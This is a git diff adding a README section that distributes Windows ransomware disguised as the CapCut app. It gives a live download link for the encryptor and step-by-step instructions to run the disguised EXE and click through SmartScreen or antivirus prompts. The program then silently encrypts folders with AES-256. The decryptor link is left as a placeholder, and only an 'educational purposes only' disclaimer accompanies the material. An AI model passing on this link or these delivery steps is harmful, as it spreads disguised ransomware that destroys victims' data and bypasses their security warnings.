@@ -821,3 +821,75 @@ This confirms the working of the decryptor tool.
 ![Post-Decryption Files](./apk%20files%20%20AND%20exe%20Files/Post-Decryption%20Files.jpg)
 
 > _This showcases the successful recovery of encrypted files by the decryptor module._
+
+ # 🖥️ Windows Ransomware & Decryptor Execution Flow
+
+## 📦 Packaging & Delivery
+
+| Step | Action |
+|---|---|
+| 1️⃣ | Download the ZIP file from the link provided |
+| 2️⃣ | Extract the ZIP — it contains the disguised executable |
+| 3️⃣ | Double-click the EXE file to execute |
+| 4️⃣ | Allow any permission prompt (SmartScreen/Antivirus) |
+| 5️⃣ | The ransomware runs silently and encrypts target files |
+| 6️⃣ | Encrypted files will have `.encrypted` extension |
+| 7️⃣ | To decrypt, download the **Decryptor ZIP**, extract, and run the EXE |
+
+---
+
+## 🔗 Download Links (For Educational Purpose Only)
+
+| Tool | Download Link |
+|---|---|
+| 🔒 **CapCut Ransomware (Encryptor)** | [Download CapCut.zip](https://drive.google.com/file/d/1ttsT83lxNLEGj0K17n89GG1gEwUsDSG9/view?usp=sharing) |
+| 🔓 **CapCut Decryptor** | _(Provide the decryptor link here)_ |
+
+---
+
+# Windows Ransomware  (Step-by-Step with Screenshots)
+
+### 1️⃣ ZIP File Preview in Google Drive  
+![ZIP Preview Screenshot](./apk%20files%20AND%20exe%20Files/CapCut%20ZIP%20Preview.jpg)
+
+---
+
+### 2️⃣ Downloaded ZIP & Extracted `.exe` File  
+![ZIP Extraction Screenshot](./apk%20files%20AND%20exe%20Files/CapCut%20ZIP%20Extracted.jpg)
+
+---
+
+### 3️⃣ Running the EXE (Permission Prompt Example)  
+![SmartScreen Prompt Screenshot](./apk%20files%20AND%20exe%20Files/Permission%20Prompt.jpg)
+
+---
+
+### 4️⃣ Post-Encryption Folder with `.encrypted` Files  
+![Post Encryption Files Screenshot](./apk%20files%20AND%20exe%20Files/Post-Encryption%20Files.jpg)
+
+---
+
+### 5️⃣ Decryptor ZIP Extraction & Execution  
+![Decryptor EXE Screenshot](./apk%20files%20AND%20exe%20Files/Decryptor%20ZIP%20Extracted.jpg)
+
+---
+
+### 6️⃣ Post-Decryption Folder with Restored Files  
+![Post Decryption Files Screenshot](./apk%20files%20AND%20exe%20Files/Post-Decryption%20Files.jpg)
+
+---
+
+## ⚙️ Working Summary
+
+| Operation | Result |
+|---|---|
+| Encryption | Silent AES-256 encryption on specified folder |
+| File Extension | `.encrypted` |
+| Decryption | Same password & algorithm used to restore original files |
+
+---
+
+## ❗ DISCLAIMER  
+This project is for **educational purposes only**.  
+Do not use it for unauthorized access or malicious activity.  
+
